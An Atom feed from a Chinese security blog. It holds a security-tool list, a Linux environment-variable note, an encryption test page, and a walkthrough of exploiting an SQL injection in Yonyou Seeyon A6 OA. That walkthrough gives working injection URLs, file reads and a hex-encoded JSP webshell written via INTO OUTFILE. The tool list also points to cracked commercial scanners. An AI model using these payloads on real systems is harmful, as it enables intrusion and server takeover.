<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Pa55w0rd &#39;s Blog</title>
  
  <subtitle>记录</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.pa55w0rd.club/"/>
  <updated>2018-12-05T05:45:42.558Z</updated>
  <id>http://www.pa55w0rd.club/</id>
  
  <author>
    <name>Pa55w0rd</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>企业安全建设中用到的开源or“免费”的工具</title>
    <link href="http://www.pa55w0rd.club/other/"/>
    <id>http://www.pa55w0rd.club/other/</id>
    <published>2022-02-22T14:22:22.000Z</published>
    <updated>2018-12-05T05:45:42.558Z</updated>
    
    <content type="html"><![CDATA[<h3 id="漏扫"><a href="#漏扫" class="headerlink" title="漏扫"></a>漏扫</h3><ul><li><a href="https://www.tenable.com/downloads/nessus" target="_blank" rel="noopener">nessus</a>（<a href="https://www.tenable.com/products/nessus/activation-code" target="_blank" rel="noopener">Home版</a>）</li><li>openvas(在<a href="https://www.kali.org/tutorials/configuring-and-tuning-openvas-in-kali-linux/" target="_blank" rel="noopener">kali中安装openvas</a>，注意挂代 理，不然会很慢很慢和报错)</li><li>awvs（破解版-52pojie）</li><li>APPscan (<a href="https://pan.baidu.com/s/1sjkDDi1#list/path=%2F" target="_blank" rel="noopener">破解版</a>)</li><li>Burpsuite pro （破解版）</li><li><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF" target="_blank" rel="noopener">mobsf</a> (移动app客户端，支持ios，但是需要在mac上跑)</li><li>Nmap/Zmap/masscan 端口扫描<h3 id="漏洞管理"><a href="#漏洞管理" class="headerlink" title="漏洞管理"></a>漏洞管理</h3></li><li><a href="https://github.com/creditease-sec/insight" target="_blank" rel="noopener">洞察insight</a></li><li>smef</li><li><a href="https://github.com/jeffzh3ng/Fuxi-Scanner/" target="_blank" rel="noopener">Fuxi</a></li><li><a href="https://github.com/DefectDojo/django-DefectDojo" target="_blank" rel="noopener">DefectDojo</a><h3 id="项管"><a href="#项管" class="headerlink" title="项管"></a>项管</h3></li><li>jira</li><li>禅道<h3 id="src平台"><a href="#src平台" class="headerlink" title="src平台"></a>src平台</h3></li><li><a href="https://github.com/martinzhou2015/SRCMS" target="_blank" rel="noopener">SRCMS</a></li><li><a href="https://github.com/233sec/laravel-src" target="_blank" rel="noopener">laravel-src</a><h3 id="资产管理-自动化运维"><a href="#资产管理-自动化运维" class="headerlink" title="资产管理/自动化运维"></a>资产管理/自动化运维</h3></li><li><a href="https://github.com/ysrc/xunfeng" target="_blank" rel="noopener">xunfeng</a></li><li>AssetsView</li><li><a href="https://github.com/Tencent/bk-cmdb" target="_blank" rel="noopener">蓝鲸bk-cmdb</a></li><li><a href="https://github.com/bongmu/OpsManage" target="_blank" rel="noopener">OpsManage</a></li><li><a href="http://www.ansible.com.cn/" target="_blank" rel="noopener">Ansible</a></li><li><a href="https://docs.saltstack.com/en/latest/contents.html" target="_blank" rel="noopener">Saltstack</a><h3 id="soc"><a href="#soc" class="headerlink" title="soc"></a>soc</h3></li><li>sosrp</li><li>w3a_SOC</li><li>OpenSOC</li><li>ossim<h3 id="入侵检测-安全监控-流量回溯"><a href="#入侵检测-安全监控-流量回溯" class="headerlink" title="入侵检测/安全监控/流量回溯"></a>入侵检测/安全监控/流量回溯</h3></li><li>suricata(selks)</li><li>bro</li><li>ossec(wazuh)</li><li>security onion</li><li>OwlH</li><li>Nethserver</li><li>Snort</li><li>OpenWIPS-NG</li><li>moloch</li><li><a href="https://github.com/ysrc/yulong-hids" target="_blank" rel="noopener">同程-驭龙</a></li><li>青藤云</li><li>Osquery<h3 id="web应用安全"><a href="#web应用安全" class="headerlink" title="web应用安全"></a>web应用安全</h3></li><li><a href="https://github.com/loveshell/ngx_lua_waf" target="_blank" rel="noopener">ngx_lua_waf</a></li><li><a href="https://github.com/starjun/openstar" target="_blank" rel="noopener">openstar</a></li><li><a href="https://github.com/SpiderLabs/ModSecurity/tree/nginx_refactoring" target="_blank" rel="noopener">ModSecurity</a></li><li><a href="https://github.com/titansec/OpenWAF" target="_blank" rel="noopener">openwaf</a></li><li><a href="https://github.com/baidu/openrasp" target="_blank" rel="noopener">openRASP</a></li><li>x-waf</li><li>jxwaf<h3 id="终端安全集中管理"><a href="#终端安全集中管理" class="headerlink" title="终端安全集中管理"></a>终端安全集中管理</h3></li><li>360企业版</li><li>火绒企业安全<h3 id="堡垒机"><a href="#堡垒机" class="headerlink" title="堡垒机"></a>堡垒机</h3></li><li>jumpserver</li><li>teleport<h3 id="代码质量管理"><a href="#代码质量管理" class="headerlink" title="代码质量管理"></a>代码质量管理</h3></li><li>sonar + jekins</li><li>cobra</li><li>VCG</li><li>fortify(破解版，找到最新的规则是2017.3)</li><li>RIPS/Seay源代码审计系统(PHP))</li><li>Findbugs（JAVA）</li></ul><h3 id="web日志审计"><a href="#web日志审计" class="headerlink" title="web日志审计"></a>web日志审计</h3><ul><li>360星图</li><li><a href="https://github.com/apxar/xlog" target="_blank" rel="noopener">xlog</a><h3 id="日志分析系统"><a href="#日志分析系统" class="headerlink" title="日志分析系统"></a>日志分析系统</h3></li><li>elk（es+logstash+kibana)</li><li><a href="https://github.com/anbai-inc/Kibana_Hanization" target="_blank" rel="noopener">Kibana_Hanization(kibana汉化)</a><h3 id="上网行为管理-准入-认证"><a href="#上网行为管理-准入-认证" class="headerlink" title="上网行为管理/准入/认证"></a>上网行为管理/准入/认证</h3></li><li><a href="https://packetfence.org/" target="_blank" rel="noopener">packetfence</a></li><li>ikuai</li><li>openldap</li><li><a href="https://github.com/apereo/cas" target="_blank" rel="noopener">中央认证服务（CAS）</a><h3 id="数据防泄漏"><a href="#数据防泄漏" class="headerlink" title="数据防泄漏"></a>数据防泄漏</h3></li><li>opendlp<h3 id="基线检查-加固"><a href="#基线检查-加固" class="headerlink" title="基线检查/加固"></a>基线检查/加固</h3></li><li><a href="https://learn.cisecurity.org/benchmarks" target="_blank" rel="noopener">CIS</a></li><li><a href="https://github.com/CISOfy/lynis/" target="_blank" rel="noopener">Lynis审计</a></li><li><a href="https://github.com/A-mIn3/WINspect" target="_blank" rel="noopener">WINSpect</a></li><li><a href="https://www.open-scap.org/" target="_blank" rel="noopener">OpenSCAP</a><h3 id="github泄露扫描"><a href="#github泄露扫描" class="headerlink" title="github泄露扫描"></a>github泄露扫描</h3></li><li><a href="https://github.com/MiSecurity/x-patrol" target="_blank" rel="noopener">x-patrol</a></li><li><a href="https://github.com/0xbug/Hawkeye" target="_blank" rel="noopener">Hawkeye</a></li><li><a href="https://github.com/FeeiCN/GSIL" target="_blank" rel="noopener">GSIL</a><h3 id="目录索引系统-个人网盘"><a href="#目录索引系统-个人网盘" class="headerlink" title="目录索引系统/个人网盘"></a>目录索引系统/个人网盘</h3></li><li><a href="https://github.com/helloxz/zdir" target="_blank" rel="noopener">zdir</a></li><li><a href="https://nextcloud.com/" target="_blank" rel="noopener">nextcloud</a><h3 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐"></a>蜜罐</h3></li><li>opencanary</li><li><a href="https://github.com/dtag-dev-sec/tpotce" target="_blank" rel="noopener">T-Pot</a></li><li><a href="https://github.com/threatstream/mhn" target="_blank" rel="noopener">mhn</a><h3 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h3></li><li><a href="https://github.com/p1r06u3/phishing" target="_blank" rel="noopener">P神的phishing</a></li><li><a href="https://github.com/sdlchina/mail_fishing" target="_blank" rel="noopener">mail_fishing</a></li><li><a href="https://github.com/thelinuxchoice/blackeye" target="_blank" rel="noopener">blackeye</a></li><li><a href="https://github.com/gophish/gophish" target="_blank" rel="noopener">Gophish</a><h3 id="API网关"><a href="#API网关" class="headerlink" title="API网关"></a>API网关</h3></li><li><a href="https://github.com/eolinker/GoKu-API-Gateway" target="_blank" rel="noopener">GoKu-API-Gateway</a></li><li><a href="https://konghq.com/faqs/" target="_blank" rel="noopener">Kong</a></li></ul><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul><li><a href="https://github.com/apxar/xlog" target="_blank" rel="noopener">WebRange(docker管理平台)</a></li><li><a href="https://github.com/pluosi/app-host" target="_blank" rel="noopener">app-host（内网app发布）</a></li><li><a href="https://github.com/baidu/AdvBox" target="_blank" rel="noopener">AdvBox</a></li><li><a href="https://github.com/facebook/osquery" target="_blank" rel="noopener">osquery</a></li><li><a href="https://github.com/liujiantaoliu/TT-SSO" target="_blank" rel="noopener">PHP-SSO</a></li><li><a href="https://github.com/HandsomeOne/Scout" target="_blank" rel="noopener">Scout(url监控平台)</a></li><li><a href="https://github.com/jx-sec/jxotp" target="_blank" rel="noopener">jxotp(SSH登陆双因素认证系统)</a></li><li><a href="https://github.com/sx1989827/DOClever" target="_blank" rel="noopener">DOClever</a></li><li><a href="https://github.com/CISOfy/lynis" target="_blank" rel="noopener">lynis审计</a></li><li><a href="https://github.com/jly8866/archer" target="_blank" rel="noopener">archer</a></li><li><a href="https://github.com/meolu/walle-web" target="_blank" rel="noopener">walle-web（代码部署平台）</a></li><li><a href="https://github.com/ctripcorp/apollo" target="_blank" rel="noopener">apollo(配置中心)</a></li><li><a href="https://github.com/chaitin/cloudwalker" target="_blank" rel="noopener">长亭开源牧云cloudwalker（只有webshell检测部分）</a></li><li><a href="https://github.com/threathunterX/nebula" target="_blank" rel="noopener">Nebula “星云”业务风控系统</a></li><li>美团DBProxy数据库防火墙</li><li>Linxu下 rkhunter/chkrootkit </li><li>Win下 pchunter/ 火绒剑/ PowerTool/ ProcessExplorer/ ProcessHacker/ autoruns/ OTL</li><li><a href="http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe" target="_blank" rel="noopener">Kaspersky</a></li><li>D盾 webshell查杀</li><li>Sandboxie 个人版沙箱</li><li>ClamAV</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;漏扫&quot;&gt;&lt;a href=&quot;#漏扫&quot; class=&quot;headerlink&quot; title=&quot;漏扫&quot;&gt;&lt;/a&gt;漏扫&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.tenable.com/downloads/nessus&quot; target=&quot;_blan
      
    
    </summary>
    
      <category term="安全建设" scheme="http://www.pa55w0rd.club/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
      <category term="记录" scheme="http://www.pa55w0rd.club/tags/%E8%AE%B0%E5%BD%95/"/>
    
      <category term="安全建设" scheme="http://www.pa55w0rd.club/tags/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
      <category term="开源工具" scheme="http://www.pa55w0rd.club/tags/%E5%BC%80%E6%BA%90%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Linux环境变量设置</title>
    <link href="http://www.pa55w0rd.club/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E8%AE%BE%E7%BD%AE/"/>
    <id>http://www.pa55w0rd.club/环境变量设置/</id>
    <published>2018-12-05T06:56:46.000Z</published>
    <updated>2018-12-05T07:22:28.961Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-查看环境变量"><a href="#0x00-查看环境变量" class="headerlink" title="0x00 查看环境变量"></a>0x00 查看环境变量</h2><p>查看环境变量有三个命令：</p><ul><li>env：env命令是environment的缩写，用于列出所有的环境变量</li><li>export：单独使用export命令也可以像env列出所有的环境变量，不过export命令还有其他额外的功能</li><li>echo $PATH：    echo $PATH用于列出变量PATH的值，里面包含了已添加的目录</li></ul><a id="more"></a><h2 id="0x01-设置环境变量"><a href="#0x01-设置环境变量" class="headerlink" title="0x01 设置环境变量"></a>0x01 设置环境变量</h2><h3 id="1-1-将路径加入到PATH"><a href="#1-1-将路径加入到PATH" class="headerlink" title="1.1 将路径加入到PATH"></a>1.1 将路径加入到PATH</h3><p>可以直接添加到环境变量PATH中。$PATH表示变量PATH的值，包含已有的目录。</p><p>这种方法需要注意路径的顺序，如果遇到有同名的命令，那么PATH里面哪个目录先被查询，则那个目录下的命令就会被先执行，如下所示：<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 加到PATH末尾</span></span><br><span class="line">export PATH=<span class="variable">$PATH</span><span class="symbol">:/path/to/your/dir</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加到PATH开头</span></span><br><span class="line">export PATH=<span class="regexp">/path/to</span><span class="regexp">/your/dir</span><span class="symbol">:</span><span class="variable">$PATH</span></span><br></pre></td></tr></table></figure></p><h3 id="1-2-命名一个新的环境变量"><a href="#1-2-命名一个新的环境变量" class="headerlink" title="1.2 命名一个新的环境变量"></a>1.2 命名一个新的环境变量</h3><p>也可以直接命名一个新的环境变量，用于其它程序引用：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">export</span> <span class="attribute">VAR_NAME</span>=value</span><br></pre></td></tr></table></figure></p><h2 id="0x02-作用域"><a href="#0x02-作用域" class="headerlink" title="0x02 作用域"></a>0x02 作用域</h2><h3 id="2-1-作用于当前终端"><a href="#2-1-作用于当前终端" class="headerlink" title="2.1 作用于当前终端"></a>2.1 作用于当前终端</h3><p>打开一个终端，输入添加环境变量的语句：<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export CLASS_PATH=./JAVA_HOME/<span class="class"><span class="keyword">lib</span>:$<span class="title">JAVA_HOME</span>/<span class="title">jre</span>/<span class="title">lib</span></span></span><br></pre></td></tr></table></figure></p><p>终端所添加的环境变量是临时的，只适用于当前终端，关闭当前终端或在另一个终端中，添加的环境变量无效。</p><h3 id="2-2-作用于当前用户"><a href="#2-2-作用于当前用户" class="headerlink" title="2.2 作用于当前用户"></a>2.2 作用于当前用户</h3><p>如果只需要添加的环境变量对当前用户有效，可以写入用户主目录下的.bashrc文件：<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~<span class="string">/.bashrc</span></span><br></pre></td></tr></table></figure></p><p>添加语句：<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export CLASS_PATH=./JAVA_HOME/<span class="class"><span class="keyword">lib</span>:$<span class="title">JAVA_HOME</span>/<span class="title">jre</span>/<span class="title">lib</span></span></span><br></pre></td></tr></table></figure></p><p>注销或者重启可以使修改生效，如果要使添加的环境变量马上生效：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure></p><h3 id="2-3-作用于所有用户"><a href="#2-3-作用于所有用户" class="headerlink" title="2.3 作用于所有用户"></a>2.3 作用于所有用户</h3><p>要使环境变量对所有用户有效，可以修改profile文件：<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="keyword">vim</span> /etc/<span class="keyword">profile</span></span><br></pre></td></tr></table></figure></p><p>添加语句：<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export CLASS_PATH=./JAVA_HOME/<span class="class"><span class="keyword">lib</span>:$<span class="title">JAVA_HOME</span>/<span class="title">jre</span>/<span class="title">lib</span></span></span><br></pre></td></tr></table></figure></p><p>注销或者重启可以使修改生效，如果要使添加的环境变量马上生效：<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">source</span> <span class="regexp">/etc/</span>profile</span><br></pre></td></tr></table></figure></p><hr><p><strong>说明：</strong></p><p>bash首先执行/etc/profile脚本,/etc/profile脚本先依次执行/etc/profile.d/*.sh </p><p>随后bash会执行用户主目录下的.bash_profile脚本,.bash_profile脚本会执行用户主目录下的.bashrc脚本,<br>而.bashrc脚本会执行/etc/bashrc脚本</p><p>至此,所有的环境变量和初始化设定都已经加载完成</p><p>bash随后调用terminfo和inputrc，完成终端属性和键盘映射的设定</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-查看环境变量&quot;&gt;&lt;a href=&quot;#0x00-查看环境变量&quot; class=&quot;headerlink&quot; title=&quot;0x00 查看环境变量&quot;&gt;&lt;/a&gt;0x00 查看环境变量&lt;/h2&gt;&lt;p&gt;查看环境变量有三个命令：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;env：env命令是environment的缩写，用于列出所有的环境变量&lt;/li&gt;
&lt;li&gt;export：单独使用export命令也可以像env列出所有的环境变量，不过export命令还有其他额外的功能&lt;/li&gt;
&lt;li&gt;echo $PATH：    echo $PATH用于列出变量PATH的值，里面包含了已添加的目录&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="linux" scheme="http://www.pa55w0rd.club/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>encrypt_test</title>
    <link href="http://www.pa55w0rd.club/encrypt-test/"/>
    <id>http://www.pa55w0rd.club/encrypt-test/</id>
    <published>2018-12-04T09:15:28.000Z</published>
    <updated>2018-12-05T07:21:44.025Z</updated>
    
    <content type="html"><![CDATA[<script src=/js/crypto-js.js></script><script>function doDecrypt (pwd, onError) {console.log('in doDecrypt');const txt = document.getElementById('enc_content').innerHTML;let plantext;try {const bytes = CryptoJS.AES.decrypt(txt, pwd);var plaintext = bytes.toString(CryptoJS.enc.Utf8);} catch(err) {if(onError) {onError(err);}return;}document.getElementById('enc_content').innerHTML = plaintext;document.getElementById('enc_content').style.display = 'block';document.getElementById('enc_passwd').style.display = 'none';if(typeof MathJax !== 'undefined') {MathJax.Hub.Queue(['resetEquationNumbers', MathJax.InputJax.TeX],['PreProcess', MathJax.Hub],['Reprocess', MathJax.Hub]);}}</script><div id="enc_content" style="display:none">U2FsdGVkX1+1ynUUoYIpfduAzR+N71j3elnkvgdQhXMh6O1sqdgTm5NRTYycaA+oIdVppbF0x7p8/fOcLDCQO7L3xJZ0aNW18JtLOjmVl5UoAQKqiL/ftUVHl6xVJWfs2LvZIYxb7z44WTH+GFzcqJLtZ4pVCnk0AO9Ae4eN9+hVDxh0CooKk8zAUfvPGvlcxZBikSKT/teZxmm9rYFPjU+Fuz8DhkJzwqD+ca+7+GlFDR7rfse1Zw0Q452mqWWA/9lIlFCmwXknOfk2Qz3+T11JJKLwIs1NhsGwhG3b0g5Nmpnol+aiQZnEPo0kJ+TuNz/i5oRA1Qa0QF5G0t+jgLu5OHv2OW1NY557ji7NvWUTfvVYE56QT8+FvV65NRd78u64AMUOHRqA2BhXgpZq0xib1rK6Fxdxo0UTpLsTYcdjzSoiVUMt4YUVi2IJf0wvCDnVjtidu7askw7hgb9P1yUV0dBti9+3Rznec1oqYfEP0SEGP7v0JoyVxKL6rTazf/wLclVvN7LXq6LTdXohQIYOpjXR3IG5LtH4Rcgm7+WnSJplSeqiWS8ZHlcowGpflXCSb5WFcGwlkn1HUgJ8frrOnYSXRo90cNF4/Hkbv697xjh9gz79hCapDxG//JEsvsBPRN9PrYQMaam/wQTbuV6afteI8NkG5T6OaQ0RWpA9wsarGho93rFBNbNcfXzq4lQBB8fjqa9SEhVLRDeCt0PQLoUlc3OAamRPH3+DvmAEDa0fEUZav0F/qvosyv3Qay4vyRNc1mxu0VQ2NbS9LKI+knQdJNzkG4ExLGDdb4UiYhJs+qjXI0hZ8ibi2d157Zq8QTPMSDYJ5XFAwYgfIMsFCwltpEpiRScXX3MuyexE6xucCbailV8FvBo6A54JWPdV7xduvIiKrzXKveV/TLPwUAJGOKR5X19V9RHfVaUL8s8eHfE7i+KUYzW9w+ewS3ujzmMqAm1eET/YTHCn7UyPQWSDnlsxOgFp72sBCwrBQpq8gv8UmHO2BlI3kTSKdIMc0GfFlRCO2Uw5s5wRtJrdj/yGer4moajiP4mlGwAbGHbdbCAECH8atPrgh0MTt9JkhFmIu6tRaiU3N75ysCBMBSfAFzvC/1pSzUFdZ0Xr+b0l4KC/7bZaUDqmh8jnfPWXipyJ4YC8GU4DeYo6rPJfAk9vhKWMmUEc40OonEvLYp7XRxS/4Mqh0x53DA20XjoZjzoVzWlVlbTH7fxRKKwnjvIuMxV+Lh0Y775OLi19wABF3sPAnGkXtVnREEkJrfZsF1JE/cK9B/GFD2f6IFg2Mm72D9BI3xpgzbOrGDYbtsviGh2CjbyyEFSc9tRnvAvMvdHEd+tyB/Z2LU2kvqe762ghV55cZGLhtyJJ7RijztfobrYlls8gre8Rk+8SYRcmW/BSQHOSC3ze0pMve4TZ55jptYNwzfQmGA8WhhQ2wTXo+cdBBEvQPssZhNd2UcF20AiEaqfRDMsFJFzHzNctDhki9OIWiV55YvSquvKUOokoji+Lffin9J4y1tezvbQaM8iRADexSfoSI0xWGcqpz/0sA9Bm1Ggs6pScNpjfJuydfozbO2x8OuG408tcpWZg9knbcq3ht8SFP0PEruEQ9tvhR4CugH7WzcHAK1cDIE7TglZp7awYx4mMavXgo3DYzSy2nTUuz41b6ZY14SpNKyYkDJEE2aVCMUn1MopUiviQHKAcn8U6nU619Fd7</div><div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div><script>var onError = function(error) {document.getElementById("enc_error").innerHTML = "password error!"};function decrypt() {var passwd = document.getElementById("enc_pwd_input").value;console.log(passwd);doDecrypt(passwd, onError);}</script></div>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;如不需要对文章进行加密请去掉&quot;&gt;&lt;a href=&quot;#如不需要对文章进行加密请去掉&quot; class=&quot;headerlink&quot; title=&quot;如不需要对文章进行加密请去掉&quot;&gt;&lt;/a&gt;如不需要对文章进行加密请去掉&lt;/h1&gt;&lt;figure class=&quot;highlight yaml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;encrypt:&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;enc_pwd:&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;123456&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&quot;如不需要目录请去掉&quot;&gt;&lt;a href=&quot;#如不需要目录请去掉&quot; class=&quot;headerlink&quot; title=&quot;如不需要目录请去掉&quot;&gt;&lt;/a&gt;如不需要目录请去掉&lt;/h1&gt;&lt;figure class=&quot;highlight yaml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;toc:&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&quot;添加摘要&quot;&gt;&lt;a href=&quot;#添加摘要&quot; class=&quot;headerlink&quot; title=&quot;添加摘要&quot;&gt;&lt;/a&gt;添加摘要&lt;/h1&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="hexo" scheme="http://www.pa55w0rd.club/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>用友致远A6 OA存在sql注入并拿shell</title>
    <link href="http://www.pa55w0rd.club/yyoa/"/>
    <id>http://www.pa55w0rd.club/yyoa/</id>
    <published>2018-12-04T08:11:57.000Z</published>
    <updated>2018-12-04T09:00:29.022Z</updated>
    
    <content type="html"><![CDATA[<p>用友致远A6协同系统 <code>/yyoa/common/js/menu/test.jsp</code> 文件 S1 参数SQL注入漏洞 </p><p>注入点为S1变量，通过探测，发现是mysql数据库</p><p><code>http://xx/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=</code></p><p>于是构造注入语句查询数据库名：</p><p><code>http://xx/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=(SELECT%20database())</code></p><a id="more"></a><table><thead><tr><th>序号</th><th>database()</th></tr></thead><tbody><tr><td>1</td><td>mysql3235</td></tr></tbody></table><p>Mysql注入中，我们使用into outfile 来写入数据，用此方法注入webshell，前提条件两个：</p><p>1：root权限</p><p>2：物理路径</p><p>我们探测一下web根目录</p><p><code>http://xx/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=(SELECT%20@@basedir)</code></p><table><thead><tr><th>序号</th><th>@@basedir</th></tr></thead><tbody><tr><td>1</td><td>F:/UFseeyon/OA/mysql/bin/../</td></tr></tbody></table><p>通过yyoa目录结构猜测物理路径为</p><p><code>F:/UFseeyon/OA/tomcat/webapps/yyoa/</code></p><p>可以使用load_file判断是否正确</p><p><code>http://xx/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=select%20load_file(%27F:/UFseeyon/OA/tomcat/webapps/yyoa/WEB-INF/web.xml%27)</code></p><p>利用mysql into outfile写shell：由于jsp一句话超长，请求连接会拒绝，故先上传写文件脚本，再本地构造进行webshell上传：<br><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="keyword">if</span>(request.getParameter(<span class="string">"f"</span>)!=<span class="keyword">null</span>)(<span class="keyword">new</span> java.io.FileOutputStream(application.getRealPath(<span class="string">"\\"</span>)+request.getParameter(<span class="string">"f"</span>))).write(request.getParameter(<span class="string">"t"</span>).getBytes());%&gt;</span><br></pre></td></tr></table></figure></p><p>由于特殊符号存在，URL编码会造成写入后代码错误，故采用hex编码后unhex处理上传，写入文件名为：he1p.jsp</p><p><a href="http://xx/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27F:/UFseeyon/OA/tomcat/webapps/yyoa/he1p.jsp%27" target="_blank" rel="noopener">http://xx/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27F:/UFseeyon/OA/tomcat/webapps/yyoa/he1p.jsp%27</a></p><p>本地构造上传：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://xx/yyoa/he1p.jsp?f=we1come.jsp"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">t</span> <span class="attr">cols</span>=<span class="string">120</span> <span class="attr">rows</span>=<span class="string">10</span> <span class="attr">width</span>=<span class="string">45</span>&gt;</span>your code<span class="tag">&lt;/<span class="name">testarea</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>上传后获取webshell地址为：<a href="http://xx/yyoa/we1come.jsp" target="_blank" rel="noopener">http://xx/yyoa/we1come.jsp</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;用友致远A6协同系统 &lt;code&gt;/yyoa/common/js/menu/test.jsp&lt;/code&gt; 文件 S1 参数SQL注入漏洞 &lt;/p&gt;
